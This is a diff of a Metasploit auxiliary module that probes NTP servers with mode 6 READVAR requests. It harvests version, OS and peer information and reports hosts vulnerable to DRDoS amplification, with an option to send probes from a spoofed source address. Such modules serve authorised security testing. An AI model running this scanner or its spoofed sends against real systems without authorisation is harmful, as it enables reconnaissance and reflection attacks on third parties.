@@ -1,69 +1,87 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
+class MetasploitModule < Msf::Auxiliary
+  include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::Udp
+  include Msf::Auxiliary::UDPScanner
+  include Msf::Auxiliary::NTP
+  include Msf::Auxiliary::DRDoS
 
-class Metasploit3 < Msf::Auxiliary
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'NTP Clock Variables Disclosure',
+      'Description'    => %q(
+        This module reads the system internal NTP variables. These variables contain
+        potentially sensitive information, such as the NTP software version, operating
+        system version, peers, and more.
+      ),
+      'Author'         =>
+        [
+          'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>', # original Metasploit module
+          'Jon Hart <jon_hart[at]rapid7.com>' # UDPScanner version for faster scans
+        ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2013-5211'], # see also scanner/ntp/ntp_monlist.rb
+          [ 'URL', 'http://www.rapid7.com/vulndb/lookup/ntp-clock-variables-disclosure' ]
+        ]
+      )
+    )
+  end
 
+  def scanner_process(data, shost, _sport)
+    @results[shost] ||= []
+    @results[shost] << Rex::Proto::NTP::NTPControl.new.read(data)
+  end
 
-	include Msf::Exploit::Remote::Udp
-	include Msf::Auxiliary::Report
-	include Msf::Auxiliary::Scanner
+  def scan_host(ip)
+    if spoofed?
+      datastore['ScannerRecvWindow'] = 0
+      scanner_spoof_send(@probe, ip, datastore['RPORT'], datastore['SRCIP'], datastore['NUM_REQUESTS'])
+    else
+      scanner_send(@probe, ip, datastore['RPORT'])
+    end
+  end
 
+  def scanner_prescan(batch)
+    @results = {}
+    print_status("Sending NTP v2 READVAR probes to #{batch[0]}->#{batch[-1]} (#{batch.length} hosts)")
+    @probe = Rex::Proto::NTP::NTPControl.new
+    @probe.version = datastore['VERSION']
+    @probe.operation = 2
+  end
 
-	def initialize(info = {})
-		super(update_info(info,
-			'Name'           => 'NTP Clock Variables Disclosure',
-			'Description'    => %q{
-					This module reads the system internal NTP variables. These variables contain
-				potentially sensitive information, such as the NTP software version, operating
-				system version, peers, and more.
-			},
-			'Author'         => [ 'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>' ],
-			'License'        => MSF_LICENSE,
-			'References'     =>
-				[
-					[ 'URL','http://www.rapid7.com/vulndb/lookup/ntp-clock-variables-disclosure' ],
-				]
-			)
-		)
-		register_options(
-		[
-			Opt::RPORT(123)
-		], self.class)
-	end
+  def scanner_postscan(_batch)
+    @results.keys.each do |k|
+      # TODO: check to see if any of the responses are actually NTP before reporting
+      report_service(
+        host: k,
+        proto: 'udp',
+        port: rport,
+        name: 'ntp',
+        info: @results[k].map { |r| r.payload.slice(0,r.payload_size) }.join.inspect
+      )
 
-	def run_host(ip)
-
-		connect_udp
-
-		readvar = "\x16\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00" #readvar command
-		print_status("Connecting target #{rhost}:#{rport}...")
-
-		print_status("Sending command")
-		udp_sock.put(readvar)
-		reply = udp_sock.recvfrom(65535, 0.1)
-		if not reply or reply[0].empty?
-			print_error("#{rhost}:#{rport} - Couldn't read NTP variables")
-			return
-		end
-		p_reply = reply[0].split(",")
-		arr_count = 0
-		while ( arr_count < p_reply.size)
-			if arr_count == 0
-				print_good("#{rhost}:#{rport} - #{p_reply[arr_count].slice(12,p_reply[arr_count].size)}") #12 is the adjustment of packet garbage
-				arr_count =  arr_count + 1
-			else
-				print_good("#{rhost}:#{rport} - #{p_reply[arr_count].strip}")
-				arr_count =  arr_count + 1
-			end
-		end
-		disconnect_udp
-
-	end
-
+      peer = "#{k}:#{rport}"
+      response_map = { @probe => @results[k] }
+      vulnerable, proof = prove_amplification(response_map)
+      what = 'NTP Mode 6 READVAR DRDoS'
+      if vulnerable
+        print_good("#{peer} - Vulnerable to #{what}: #{proof}")
+        report_vuln(
+          host: k,
+          port: rport,
+          proto: 'udp',
+          name: what,
+          refs: references
+        )
+      else
+        vprint_status("#{peer} - Not vulnerable to #{what}: #{proof}")
+      end
+    end
+  end
 end
